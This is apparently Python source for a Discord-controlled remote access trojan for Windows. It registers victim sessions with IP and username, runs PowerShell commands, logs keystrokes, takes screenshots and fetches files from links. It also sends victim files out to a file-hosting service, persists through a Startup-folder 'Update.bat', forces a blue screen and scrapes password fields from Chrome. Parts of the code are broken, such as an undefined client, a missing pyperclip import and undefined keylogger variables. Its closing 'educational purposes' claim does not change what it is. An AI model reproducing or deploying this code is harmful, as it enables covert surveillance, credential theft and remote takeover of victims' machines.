# -*- coding: utf-8 -*-


# my main modules
import asyncio
import os
import discord
import subprocess
import requests
import pyautogui
import ctypes
import sys
from dotenv import load_dotenv
import json
import pygetwindow as gw
from pynput.keyboard import Key, Listener

load_dotenv()

LOGIN = os.getlogin()
SESSION_ID = os.urandom(8).hex()
GUILD_ID = ""  # your guild id here
COMMANDS = [
    "help",
    "ping",
    "cd",
    "keylogger",
    "shell",
    "upload",
    "download",
    "exit",
    "startup",
    "blue",
    "screenshot",
    "run",
    "ls",
    "creds",
]

# error highlighters
ERROR_COLOR = 0xFF0000
INFO_COLOR = 0x00FF00

# creates the main embed
def create_embed(title, description, color=INFO_COLOR):
    embed = discord.Embed(title=title, description=f"```{description}```", color=color)
    return embed


# adds bat to temp path once user logs in
def startup(file_path=""):
    temp = os.getenv("TEMP")
    bat_path = rf'C:\Users\{LOGIN}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    if file_path == "":
        file_path = sys.argv[0]
    with open(os.path.join(bat_path, "Update.bat"), "w+") as bat_file:
        bat_file.write(r'start "" "{}"'.format(file_path))


# response with the embed
async def send_error_message(channel, error_message):
    embed = CommandContext.create_embed("Error", error_message, color=ERROR_COLOR)
    await channel.send(embed=embed)


# response with the embed
async def send_response(channel, title, content, color=INFO_COLOR):
    embed = CommandContext.create_embed(title, content, color=color)
    await channel.send(embed=embed)


# CommandContext class
class CommandContext:
    def __init__(self, message, *args):
        self.message = message
        self.args = args

    async def send_error_message(self, error_message):
        await send_error_message(self.message.channel, error_message)

    async def send_response(self, title, content, color=INFO_COLOR):
        await send_response(self.message.channel, title, content, color)


@client.event  # client event
async def on_ready():
    guild = client.get_guild(int(GUILD_ID))
    channel = await guild.create_text_channel(SESSION_ID)
    await asyncio.sleep(5)  # if it doesn't work replace with https://freeipapi.com/api/json or just /json
    ip_response = requests.get("https://ipapi.co/json/").json()
    print(ip_response)

    if ip_response.get("error"):
        error_message = ip_response.get("message", "Unknown error occurred")
        embed = discord.Embed(title="Error", description=f"API Error: {error_message}", color=0xff0000)
    else:
        country_name = ip_response.get("country_name", "Not Available")
        ip_address = ip_response.get("ip", "Not Available")

        country_ip_info = f"Country: {country_name}, IP: {ip_address}"

        commands_module_info = str(COMMANDS)

        embed = discord.Embed(title="New session created", description="", color=0xff0000)
        embed.add_field(name="session", value=f"```{SESSION_ID}```", inline=True)
        embed.add_field(name="user", value=f"```{os.getlogin()}```", inline=True)
        embed.add_field(name="ip addr", value=f"```{country_ip_info}```", inline=True)
        embed.add_field(name="Commands Module", value=f"```{commands_module_info}```", inline=False)

    await channel.send(embed=embed)


# bottom part of the embed
@client.event  # the client event
async def on_message(message):
    if message.author == client.user or message.channel.name != SESSION_ID:
        return

    content = message.content.lower()

    # help cmd
    if content == "help":
        embed = create_embed("Help", "\n".join(COMMANDS))
        await message.reply(embed=embed)
    # ping cmd
    if content == "ping":
        latency_embed = create_embed("Ping", f"Latency: {round(client.latency * 1000)}ms")
        await message.reply(embed=latency_embed)
    # cd cmd
    if content.startswith("cd"):
        directory = content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = create_embed("Changed Directory", f"{os.getcwd()}")
        except FileNotFoundError:
            embed = create_embed("Error", "Directory Not Found")
        await message.reply(embed=embed)
    # ls cmd
    if content == "ls":
        files = "\n".join(os.listdir())
        if not files:
            files = "No Files Found"
        embed = create_embed(f"Files > {os.getcwd()}", files)
        await message.reply(embed=embed)
    # keylogger cmd
    if content.startswith("keylogger"):
        global count, keys
        count += 1

        if len(args) > 0:
            key = args[0]
            keys.append(key)

        if count >= 200:
            count = 0
            keylog_message = "\n".join(keys)
            keys = []

            channel = message.channel
            await channel.send(f"Keylog:\n```{keylog_message}```")
    # shell cmd
    if content.startswith("shell"):
        command = content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        ).communicate()[0].decode("utf-8")
        if not output.strip():
            output = "No output"
        embed = create_embed(f"Shell > {os.getcwd()}", output)
        await message.reply(embed=embed)
    # upload cmd
    if content.startswith("upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)
    # download cmd
    if content.startswith("download"):
        file = message.content.split("")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except FileNotFoundError:
            embed = discord.Embed(title="Error", description="File Not Found", color=0xfafafa)
            await message.reply(embed=embed)
    # exit cmd
    if content.startswith("exit"):
        await message.channel.delete()
        await client.close()
    # startup cmd
    if content.startswith("startup"):
        await message.reply("Ok Boss")
        startup()
    # bluescreen cmd
    if content.startswith("blue"):
        await message.reply("attempting...", delete_after=0.1)
        ntdll = ctypes.windll.ntdll
        prev_value = ctypes.c_bool()
        res = ctypes.c_ulong()
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))

        try:
            if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                await message.reply("blue works!")
            else:
                await message.reply("blue doesnt work! :(")
        except Exception as e:
            await message.reply(f"an error occurred: {e}")
    # screenshot cmd
    if content.startswith("screenshot"):
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)




    if content.startswith("creds"):
        creds_path = os.path.join(os.getenv("TEMP"), "credentials.json")
        try:
            chrome_window = gw.getWindowsWithTitle("Google Chrome")[0]
            chrome_window.activate()
            pyautogui.hotkey("ctrl", "shift", "i")
            pyautogui.hotkey("ctrl", "shift", "j")
            pyautogui.write(
                'console.log(JSON.stringify([...document.querySelectorAll("input[type=password]")].map(e => ({ site: location.hostname, username: e.form ? e.form.querySelector("input[type=text]")?.value : "", password: e.value }))));'
            )
            pyautogui.hotkey("enter")
            await asyncio.sleep(2) 
            pyautogui.hotkey("ctrl", "c")  
            creds_data = pyperclip.paste()
            creds = json.loads(creds_data)
            with open(creds_path, "w") as creds_file:
                json.dump(creds, creds_file, indent=2)
            embed = discord.Embed(title="Credentials Extracted", color=0xfafafa)
            embed.set_footer(text=f"Credentials saved to {creds_path}")
            await message.reply(embed=embed, file=discord.File(creds_path))
        except Exception as e:
            await CommandContext(message).send_error_message(f"An error occurred: {e}")



    # run cmd
    if content.startswith("run"):
        file = content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = create_embed("Started", file)
        await message.reply(embed=embed)
    else:
        await CommandContext(message).send_error_message("the command was not recognised")

client.run("")  # bot token here

"""
brief description:
this code is intended for malware analysis and educational purposes only.

additional details:
- it uses the discord api for the message handlers.
- it includes a keylogger feature using pynput.
- it includes creds logger too which uploads as json file
- better error handlers
- letter highlighting
- i might update this in the future if everything runs well!
"""
